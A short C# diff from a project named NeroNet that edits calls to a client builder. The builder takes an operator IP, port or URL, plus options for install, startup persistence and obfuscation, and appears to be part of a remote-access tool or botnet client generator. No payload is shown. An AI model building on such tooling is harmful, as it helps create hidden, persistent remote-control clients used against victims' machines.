@@ -247,10 +247,9 @@ namespace NeroNet
             bool ObfFakeAttributes = false;
 
             if (txtSettingsIP.Enabled)
-                ClientBuilder.BuildClient(nudSettingsPort.Value.ToString(), txtSettingsIP.Text, "NeroNet", "NeroNet", "1", Install, Startup, Obfuscation, ObfRenaming, ObfRenamingIndex, ObfFakeAttributes);
+                ClientBuilder.BuildClient(nudSettingsPort.Value.ToString(), txtSettingsIP.Text, "client", "1", Install, Startup, Obfuscation, ObfRenaming, ObfRenamingIndex, ObfFakeAttributes);
             else
-                ClientBuilder.BuildClient("1", txtSettingsURL.Text, "NeroNet", "NeroNet", "1", Install, Startup, Obfuscation, ObfRenaming, ObfRenamingIndex, ObfFakeAttributes);
-
+                ClientBuilder.BuildClient("1", txtSettingsURL.Text, "client", "1", Install, Startup, Obfuscation, ObfRenaming, ObfRenamingIndex, ObfFakeAttributes);
 
             Process.Start("explorer.exe", Environment.CurrentDirectory + @"\Clients\");
         }
